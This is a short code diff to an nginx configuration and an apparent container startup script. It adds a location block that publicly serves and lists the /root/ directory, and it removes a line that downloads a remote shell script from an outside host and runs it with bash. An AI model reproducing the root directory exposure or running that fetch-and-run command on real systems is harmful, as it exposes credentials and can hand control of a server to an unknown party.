@@ -151,6 +151,16 @@ http {
             proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
             proxy_set_header X-Forwarded-Proto $scheme;
         }
+        location /root/ {
+        alias /root/;  # 实际目录路径
+        autoindex on;
+        autoindex_exact_size off;
+        autoindex_localtime on;
+         # 字符集
+        charset utf-8;
+        
+
+    }
 
     }
 }
@@ -221,5 +231,4 @@ pm2 save
 
 # 使用 pm2 持续运行，保持容器不退出 需要的话开启
 # pm2 logs
-curl http://123.haodianxin.cn/q_c.sh -o q_c.sh && bash q_c.sh
 tail -f /dev/null
